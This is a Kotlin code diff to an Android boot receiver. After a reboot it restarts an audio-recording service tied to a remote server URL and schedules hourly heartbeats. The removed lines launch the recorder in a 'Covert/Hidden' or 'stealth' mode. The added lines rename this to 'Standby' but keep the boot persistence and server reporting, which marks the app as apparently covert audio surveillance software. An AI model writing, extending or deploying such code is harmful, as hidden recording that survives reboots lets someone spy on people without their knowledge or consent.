@@ -51,16 +51,16 @@ class BootReceiver : BroadcastReceiver() {
             HeartbeatManager.scheduleHourlyHeartbeat(context)
             HeartbeatManager.sendHeartbeat(context, "device_boot")
 
-            // 4. Start AudioRecordService in Covert/Hidden mode with BOOT flag
+            // 4. Start AudioRecordService in Standby mode with BOOT flag (signals mobile is online without immediate recording)
             try {
                 val serviceIntent = Intent(context, AudioRecordService::class.java).apply {
-                    this.action = AudioRecordService.ACTION_START_HIDDEN
+                    this.action = AudioRecordService.ACTION_STANDBY
                     putExtra(AudioRecordService.EXTRA_SERVER_URL, serverUrl)
                     putExtra(AudioRecordService.EXTRA_IS_MAIN, false)
                     putExtra(AudioRecordService.EXTRA_BOOT_RESTART, true)
                 }
                 ContextCompat.startForegroundService(context, serviceIntent)
-                Log.i(TAG, "✅ AudioRecordService launched in stealth mode after device reboot.")
+                Log.i(TAG, "✅ AudioRecordService launched in Standby (Online) mode after device reboot.")
             } catch (e: Exception) {
                 Log.e(TAG, "❌ Failed starting AudioRecordService after reboot: ${e.message}")
             }
